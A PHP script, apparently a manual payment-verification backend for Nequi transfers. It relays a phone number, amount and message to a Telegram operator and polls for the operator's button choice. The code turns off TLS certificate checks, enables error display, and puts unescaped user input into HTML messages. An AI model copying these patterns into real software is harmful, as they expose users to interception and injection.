<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

$USED_FILE = __DIR__ . '/used_transactions.json';

/* ============================================================
   CARGAR CONFIG
   ============================================================ */
function loadConfig()
{
    $configFile = __DIR__ . '/../config.php';

    if (!file_exists($configFile)) return null;

    $config = require $configFile;

    if (!isset($config['bot_token']) || !isset($config['chat_id']))
        return null;

    return [
        'token' => $config['bot_token'],
        'chat_id' => $config['chat_id']
    ];
}

/* ============================================================
   UTIL: peticiones a la API de Telegram (JSON)
   ============================================================ */
function telegramRequest($token, $method, $body = [])
{
    $ch = curl_init("https://api.telegram.org/bot{$token}/{$method}");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($body),
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);

    $res = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($res === false) {
        return ['ok' => false, 'error' => $err];
    }

    $decoded = json_decode($res, true);
    return $decoded ?: ['ok' => false, 'error' => 'invalid_json_response', 'raw' => $res];
}

/* ============================================================
   ENVIAR A TELEGRAM (sendMessage)
   ============================================================ */
function sendToTelegram($token, $chatId, $text, $keyboard)
{
    // ✅ CORRECCIÓN 1: reply_markup debe ser array, NO json_encode()
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => ['inline_keyboard' => $keyboard]
    ];

    $res = telegramRequest($token, 'sendMessage', $payload);
    return $res;
}

/* ============================================================
   RESPONDER CALLBACK QUERY (answerCallbackQuery)
   ============================================================ */
function answerCallback($token, $callbackQueryId, $text = null, $showAlert = false)
{
    $payload = [
        'callback_query_id' => $callbackQueryId,
        'show_alert' => $showAlert
    ];
    if ($text !== null) $payload['text'] = $text;

    return telegramRequest($token, 'answerCallbackQuery', $payload);
}

/* ============================================================
   EDITAR MENSAJE (editMessageText)
   ============================================================ */
function editTelegramMessage($token, $chatId, $messageId, $newText)
{
    $payload = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $newText,
        'parse_mode' => 'HTML',
        'reply_markup' => ['inline_keyboard' => []]
    ];

    return telegramRequest($token, 'editMessageText', $payload);
}

/* ============================================================
   MANEJO DE TRANSACCIONES (archivo JSON simple)
   ============================================================ */
function getTransactions()
{
    global $USED_FILE;
    return file_exists($USED_FILE)
        ? json_decode(file_get_contents($USED_FILE), true) ?: []
        : [];
}

function saveTransaction($id, $data)
{
    global $USED_FILE;
    $all = getTransactions();
    $all[$id] = $data;
    file_put_contents($USED_FILE, json_encode($all));
}

function deleteTransaction($id)
{
    global $USED_FILE;
    $all = getTransactions();
    if (isset($all[$id])) {
        unset($all[$id]);
        file_put_contents($USED_FILE, json_encode($all));
    }
}

/* ============================================================
   VALIDACIÓN DE TRANSACTIONID
   ============================================================ */
function isValidTransactionId($tid)
{
    // ✅ CORRECCIÓN 2: Validar que tid no esté vacío
    return !empty($tid) && is_string($tid) && strlen($tid) > 0;
}

/* ============================================================
   Cargar configuración local
   ============================================================ */
$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false, 'error' => '❌ No se pudo cargar config.php']);
    exit;
}

$BOT_TOKEN = $config['token'];
$CHAT_ID   = $config['chat_id'];

/* ============================================================
   POST: Enviar mensaje al operador
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $data = json_decode(file_get_contents('php://input'), true) ?: [];

    $tid      = $data['transactionId'] ?? ('TID_' . time());
    $telefono = $data['nequi'] ?? 'N/D';
    $monto    = $data['monto'] ?? '0';
    $mensaje  = $data['mensaje'] ?? '';

    // ✅ CORRECCIÓN 3: Validar tid antes de procesar
    if (!isValidTransactionId($tid)) {
        echo json_encode(['ok' => false, 'error' => 'Invalid transaction ID']);
        exit;
    }

    $text  = "<b>💳 Nueva acción del usuario</b>\n";
    $text .= "• 🆔 ID: <code>{$tid}</code>\n";
    $text .= "• 📱 Número: <code>{$telefono}</code>\n";
    $text .= "• 💰 Monto: <b>$ {$monto}</b>\n";
    $text .= "• 📝 Mensaje: {$mensaje}\n\n";
    $text .= "Operador, selecciona una opción:";

    $keyboard = [
        [
            ['text' => '✅ Pago aceptado', 'callback_data' => "si:{$tid}"],
            ['text' => '❌ Aún no pagó',   'callback_data' => "no:{$tid}"]
        ],
        [
            ['text' => '📸 Captura', 'callback_data' => "cap:{$tid}"],
            ['text' => '📲 QR',      'callback_data' => "qr:{$tid}"]
        ]
    ];

    $res = sendToTelegram($BOT_TOKEN, $CHAT_ID, $text, $keyboard);

    if (!empty($res['ok'])) {
        saveTransaction($tid, [
            'tid' => $tid,
            'telefono' => $telefono,
            'monto' => $monto,
            'message_id' => $res['result']['message_id'] ?? null,
            'created_at' => time(),
            'status' => 'pending'
        ]);
        echo json_encode(['ok' => true, 'tid' => $tid]);
    } else {
        echo json_encode(['ok' => false, 'error' => $res]);
    }
    exit;
}

/* ============================================================
   GET: Polling esperando respuesta del operador (por transactionId)
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {

    $tid = $_GET['transactionId'];

    // ✅ CORRECCIÓN 4: Validar tid en GET también
    if (!isValidTransactionId($tid)) {
        echo json_encode(['ok' => false, 'error' => 'Invalid transaction ID']);
        exit;
    }

    // ✅ CORRECCIÓN 5: Usar hash consistente del tid (IGUAL que en 1.php)
    $statusFile = __DIR__ . '/last_update_' . md5($tid) . '.txt';
    $lastProcessedUpdateId = 0;
    if (file_exists($statusFile)) {
        $lastProcessedUpdateId = (int)file_get_contents($statusFile);
    }

    // Pedimos updates empezando desde el offset (last + 1)
    $offset = $lastProcessedUpdateId + 1;
    $updatesRes = telegramRequest($BOT_TOKEN, 'getUpdates', [
        'offset' => $offset,
        'timeout' => 1,
        'allowed_updates' => ['callback_query']
    ]);

    if (!isset($updatesRes['result']) || !is_array($updatesRes['result'])) {
        echo json_encode(['ok' => false]);
        exit;
    }

    $newLast = $lastProcessedUpdateId;
    foreach ($updatesRes['result'] as $update) {
        $updateId = (int)($update['update_id'] ?? 0);
        if ($updateId > $newLast) $newLast = $updateId;

        if (!isset($update['callback_query'])) continue;

        $cb     = $update['callback_query'];
        $dataCB = $cb['data'] ?? '';
        $from   = $cb['from']['username'] ?? $cb['from']['first_name'] ?? 'unknown';

        // ✅ CORRECCIÓN 6: Validación exacta y robusta del formato
        $parts = explode(':', $dataCB);
        if (count($parts) !== 2) continue;
        
        $receivedTid = $parts[1];
        
        // ✅ CORRECCIÓN 7: Validar que el tid coincida EXACTAMENTE
        if ($receivedTid !== $tid) continue;

        $accion = $parts[0];

        // ✅ CORRECCIÓN 8: Marcar update como procesado INMEDIATAMENTE
        file_put_contents($statusFile, $updateId);

        // Responder el callback para quitar spinner
        answerCallback($BOT_TOKEN, $cb['id']);

        $t = getTransactions()[$tid] ?? null;
        if (!$t) {
            // Transacción no encontrada: continuar
            continue;
        }

        if ($accion === 'si') {
            $accionTexto = 'Pago aceptado';
            $clientAction = 'confirmado';
        } elseif ($accion === 'no') {
            $accionTexto = 'Aún no pagó';
            $clientAction = 'rechazado';
        } elseif ($accion === 'cap') {
            $accionTexto = 'Captura solicitada';
            $clientAction = 'captura';
        } elseif ($accion === 'qr') {
            $accionTexto = 'Redirigir a QR';
            $clientAction = 'qr';
        } else {
            $accionTexto = ucfirst(str_replace('_', ' ', $accion));
            $clientAction = $accion;
        }

        $nuevoMensaje  = "<b>💳 Transacción</b>\n";
        $nuevoMensaje .= "• 🆔 ID: <code>{$tid}</code>\n";
        $nuevoMensaje .= "• 📱 Número: <code>{$t['telefono']}</code>\n";
        $nuevoMensaje .= "• 💰 Monto: <b>$ {$t['monto']}</b>\n\n";
        $nuevoMensaje .= "✅ Acción: <b>{$accionTexto}</b>\n";
        $nuevoMensaje .= "👤 Por: @{$from}";

        // Editar mensaje para reflejar la acción y quitar botones
        editTelegramMessage($BOT_TOKEN, $CHAT_ID, $t['message_id'], $nuevoMensaje);

        // Borrar transacción para no procesarla más
        deleteTransaction($tid);

        echo json_encode(['ok' => true, 'action' => $clientAction]);
        exit;
    }

    // Si no encontramos nada para esta transacción, actualizamos offset
    file_put_contents($statusFile, $newLast);

    echo json_encode(['ok' => false]);
    exit;
}

echo json_encode(['ok' => false, 'error' => '⛔ Método inválido']);
exit;
